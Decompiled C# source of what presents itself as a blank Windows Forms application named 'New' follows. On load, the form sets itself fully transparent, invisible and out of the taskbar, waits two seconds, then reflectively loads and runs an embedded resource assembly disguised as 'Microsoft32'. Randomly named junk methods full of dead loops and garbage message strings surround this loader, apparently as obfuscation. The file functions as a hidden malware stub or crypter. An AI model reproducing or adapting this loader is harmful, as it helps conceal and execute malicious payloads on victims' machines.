using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using WindowsApplication1.My.Resources;

namespace WindowsApplication1;

[DesignerGenerated]
public class Form1 : Form
{
	public class EX
	{
		public static object IM(byte[] AssemblyName, string ClassName, string MethodName, object[] args)
		{
			Assembly assembly = Assembly.Load(AssemblyName);
			Type[] types = assembly.GetTypes();
			int num = 0;
			Type type;
			object result = default(object);
			while (true)
			{
				if (num < types.Length)
				{
					type = types[num];
					if (type.IsClass && type.FullName!.EndsWith("." + ClassName))
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return result;
			}
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
			return RuntimeHelpers.GetObjectValue(type.InvokeMember(MethodName, BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), args));
		}
	}

	private IContainer components;

	[AccessedThroughProperty("SplitContainer1")]
	private SplitContainer _SplitContainer1;

	[AccessedThroughProperty("FlowLayoutPanel1")]
	private FlowLayoutPanel _FlowLayoutPanel1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	internal virtual SplitContainer SplitContainer1
	{
		get
		{
			return _SplitContainer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SplitContainer1 = value;
		}
	}

	internal virtual FlowLayoutPanel FlowLayoutPanel1
	{
		get
		{
			return _FlowLayoutPanel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FlowLayoutPanel1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		SplitContainer1 = new SplitContainer();
		FlowLayoutPanel1 = new FlowLayoutPanel();
		Button1 = new Button();
		RadioButton1 = new RadioButton();
		Label1 = new Label();
		ProgressBar1 = new ProgressBar();
		ListBox1 = new ListBox();
		((Control)SplitContainer1.get_Panel2()).SuspendLayout();
		((Control)SplitContainer1).SuspendLayout();
		((Control)FlowLayoutPanel1).SuspendLayout();
		((Control)this).SuspendLayout();
		SplitContainer1.set_Dock((DockStyle)5);
		SplitContainer splitContainer = SplitContainer1;
		Point location = new Point(0, 0);
		((Control)splitContainer).set_Location(location);
		((Control)SplitContainer1).set_Name("SplitContainer1");
		((Control)SplitContainer1.get_Panel2()).get_Controls().Add((Control)(object)FlowLayoutPanel1);
		((Control)SplitContainer1.get_Panel2()).get_Controls().Add((Control)(object)ListBox1);
		SplitContainer splitContainer2 = SplitContainer1;
		Size size = new Size(284, 262);
		((Control)splitContainer2).set_Size(size);
		SplitContainer1.set_SplitterDistance(94);
		((Control)SplitContainer1).set_TabIndex(0);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Button1);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)RadioButton1);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)Label1);
		((Control)FlowLayoutPanel1).get_Controls().Add((Control)(object)ProgressBar1);
		FlowLayoutPanel flowLayoutPanel = FlowLayoutPanel1;
		location = new Point(3, 3);
		((Control)flowLayoutPanel).set_Location(location);
		((Control)FlowLayoutPanel1).set_Name("FlowLayoutPanel1");
		FlowLayoutPanel flowLayoutPanel2 = FlowLayoutPanel1;
		size = new Size(200, 100);
		((Control)flowLayoutPanel2).set_Size(size);
		((Control)FlowLayoutPanel1).set_TabIndex(0);
		Button button = Button1;
		location = new Point(3, 3);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(84, 3);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(2);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(3, 29);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("Label1");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(48, 32);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(100, 10);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(3);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(34, 135);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(2);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 262);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)SplitContainer1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_Text("New");
		((Control)SplitContainer1.get_Panel2()).ResumeLayout(false);
		((Control)SplitContainer1).ResumeLayout(false);
		((Control)FlowLayoutPanel1).ResumeLayout(false);
		((Control)FlowLayoutPanel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public void I5021dg()
	{
		new decimal(622697L);
		new decimal(65L);
		new decimal(2637929L);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		Run();
	}

	private object plpwUza73AQp7PL7E4Z()
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		int num = 58;
		do
		{
			new decimal(1401764L);
			num = checked(num + 1);
		}
		while (num <= 28956);
		new decimal(70903790L);
		Interaction.MsgBox((object)"VsgRO7WyrgzKyO", (MsgBoxStyle)0, (object)null);
		return 70554751;
	}

	public void Run()
	{
		Thread.Sleep(2000);
		EX.IM(Resources.Microsoft32, "Class1", "Main", new object[0]);
	}

	public object vVTNF1B8Q1V()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		decimal num = new decimal(968359L);
		int num2 = 12874;
		checked
		{
			do
			{
				try
				{
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					try
					{
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						num = default(decimal);
						ProjectData.ClearProjectError();
					}
					new decimal(2499732L);
					ProjectData.ClearProjectError();
				}
				MessageBox.Show("%^Š]}+‹\u0081Žw‹+‘<>-DEXb,%0.‘MWhIVŠ\u0081~^\u007fU)F\u0081V\u007fev1un[^p~SZ+ 9’M|^PfBXW€*?SP|$");
				num2++;
			}
			while (num2 <= 65002);
			int num3 = 738;
			do
			{
				new decimal(827L);
				try
				{
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					num = new decimal(47001L);
					while (true)
					{
						num = new decimal(9451L);
						try
						{
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							num = new decimal(641124308L);
							while (true)
							{
							}
						}
						try
						{
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
				}
				Interaction.MsgBox((object)"’€}[Bf]v%c0H}*vW5^F5…;€‚1~\u008ds'd|O|NFi>:JSjLQ1ZZU2=/\u008fQu?Lv \u008dIW", (MsgBoxStyle)0, (object)null);
				num3++;
			}
			while (num3 <= 78006);
			return 37495;
		}
	}

	private object GF0zc7u8iV3VbbEz14s6()
	{
		while (true)
		{
		}
	}
}
